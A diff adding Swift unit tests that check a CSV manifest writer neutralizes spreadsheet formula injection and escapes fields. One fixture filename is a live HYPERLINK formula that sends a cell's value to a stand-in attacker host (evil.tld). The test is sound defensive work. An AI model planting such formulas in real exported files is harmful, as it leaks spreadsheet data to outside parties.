@@ -210,4 +210,34 @@ final class ManifestTrustTests: XCTestCase {
         XCTAssertEqual(report.conflicts, 0)
         XCTAssertEqual(report.total, 1, "the same file recorded twice is still one file")
     }
+
+    // MARK: - CSV formula injection
+
+    func testCSVNeutralizesFormulaLeaders() {
+        // `name` is the raw card filename — the one manifest field that never
+        // passes PathPlanner.sanitize — and this CSV is meant for a spreadsheet.
+        let m = Manifest(
+            schema: Manifest.schemaID, app: Manifest.appName,
+            createdAt: Date(timeIntervalSince1970: 0), source: nil,
+            primaryDestination: "/tmp", archiveDestination: nil, destinations: nil,
+            verified: true, filesCopied: 1, filesSkipped: 0, filesFailed: 0,
+            totalBytes: 0, elapsedSeconds: 0,
+            files: [ManifestEntry(name: #"=HYPERLINK("https://evil.tld/?"&A2,"OK").CR2"#,
+                                  path: "2026/a.bin", bytes: 0, xxhash64: "0", status: "copied")])
+        let csv = ManifestWriter.csv(m)
+        XCTAssertFalse(csv.contains("\n=HYPERLINK"), "must not begin a cell with a live formula")
+        XCTAssertTrue(csv.contains("'=HYPERLINK"))
+    }
+
+    func testCSVFieldEscaping() {
+        XCTAssertEqual(ManifestWriter.csvField("plain.CR2"), "plain.CR2")
+        XCTAssertEqual(ManifestWriter.csvField("=cmd"), "'=cmd")
+        XCTAssertEqual(ManifestWriter.csvField("+cmd"), "'+cmd")
+        XCTAssertEqual(ManifestWriter.csvField("@cmd"), "'@cmd")
+        XCTAssertEqual(ManifestWriter.csvField("-cmd"), "'-cmd")
+        // A bare CR would otherwise break row structure.
+        XCTAssertEqual(ManifestWriter.csvField("a\rb"), "\"a\rb\"")
+        XCTAssertEqual(ManifestWriter.csvField("a,b"), "\"a,b\"")
+        XCTAssertEqual(ManifestWriter.csvField("say \"hi\""), "\"say \"\"hi\"\"\"")
+    }
 }
